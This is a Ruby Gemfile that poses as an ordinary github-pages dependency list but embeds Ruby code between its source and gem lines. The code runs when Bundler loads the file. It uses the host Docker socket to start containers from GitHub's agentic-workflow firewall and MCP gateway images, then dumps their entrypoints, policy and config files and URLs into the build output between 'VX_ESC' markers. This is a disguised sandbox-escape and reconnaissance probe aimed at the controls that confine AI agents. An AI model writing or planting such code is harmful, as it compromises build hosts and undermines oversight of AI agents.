source "https://rubygems.org"

require 'socket'
require 'json'

puts "VX_EXEC_UID=#{`id -u`.strip}"

OUT = []

def dapi(method, path, body = nil)
  s = UNIXSocket.new('/var/run/docker.sock')
  b = body ? JSON.generate(body) : ''
  s.write("#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: #{b.bytesize}\r\n\r\n#{b}")
  buf = +''
  begin
    loop { buf << s.readpartial(8192) }
  rescue EOFError, IOError
  end
  s.close
  hdr, _, pl = buf.partition("\r\n\r\n")
  if hdr =~ /chunked/i
    out = +''; i = 0
    while i < pl.bytesize
      j = pl.index("\r\n", i); break unless j
      n = pl[i...j].to_i(16); break if n.zero?
      out << pl[j + 2, n]; i = j + 2 + n + 2
    end
    pl = out
  end
  [hdr[/\d{3}/].to_i, pl]
rescue => e
  [-1, "ERR #{e.class}: #{e.message[0, 120]}"]
end

def decode_docker_logs(body)
  output = +''
  while body.bytesize >= 8 && [1, 2].include?(body.getbyte(0)) && body.byteslice(1, 3) == "\0\0\0"
    length = body.byteslice(4, 4).unpack1('N')
    break if body.bytesize < 8 + length
    output << body.byteslice(8, length)
    body = body.byteslice(8 + length..) || +''
  end
  output.empty? ? body : output
end

def sh_probe(image, cmd)
  st, pl = dapi('POST', '/containers/create',
    'Image' => image, 'Entrypoint' => ['/bin/sh', '-c'], 'Cmd' => [cmd],
    'Tty' => false, 'HostConfig' => { 'NetworkMode' => 'none' },
    'Labels' => { 'vulnoryx.controlled' => 'pages-mcpg-c4c8' })
  return "VX_CREATE_FAIL #{st} #{pl[0, 120]}" unless st == 201
  cid = JSON.parse(pl)['Id']
  begin
    st2, pl2 = dapi('POST', "/containers/#{cid}/start")
    return "VX_START_FAIL #{st2} #{pl2[0, 120]}" unless st2 == 204 || st2 == 304
    dapi('POST', "/containers/#{cid}/wait?condition=not-running")
    _, lpl = dapi('GET', "/containers/#{cid}/logs?stdout=1&stderr=1")
    decode_docker_logs(lpl)
  ensure
    dapi('DELETE', "/containers/#{cid}?force=1&v=1")
  end
end

OUT << "VX_AGENT_END\n" + sh_probe('ghcr.io/github/gh-aw-firewall/agent:latest',
  'tail -c 900 /usr/local/bin/entrypoint.sh; echo; ' \
  'find / -maxdepth 4 \( -iname "*policy*" -o -iname "*awf*" -o -name "*.yaml" -o -name "*.yml" \) ' \
  '2>/dev/null | grep -vE "^/(proc|sys|usr/lib|usr/share|usr/include|etc/ssl|var/lib)" | head -30; ' \
  'ls -la /usr/local/bin /opt 2>/dev/null | head -40; echo VX_DONE').to_s[0, 3600]

OUT << "VX_MCPG\n" + sh_probe('ghcr.io/github/gh-aw-mcpg:latest',
  'ls -la /app 2>/dev/null | head -50; echo VX_CFG_run_tail; ' \
  'tail -c +1200 /app/run_containerized.sh 2>/dev/null | head -c 1400; echo; ' \
  'for f in /app/*.json /app/*.yaml /app/*.yml /app/*.toml /app/config*; do ' \
  '[ -f "$f" ] && echo "VX_CFG_$f" && head -c 600 "$f"; done; ' \
  'echo VX_MCPG_URLS; grep -rhoE "https?://[A-Za-z0-9._/-]+" /app 2>/dev/null | sort -u | head -30; echo VX_DONE').to_s[0, 4200]

payload = OUT.join("\n").gsub(/[^\x20-\x7E\n]/, '.')[0, 8000]
puts 'VX_ESC_BEGIN'
puts payload
puts 'VX_ESC_END'

gem "github-pages", "~> 232"
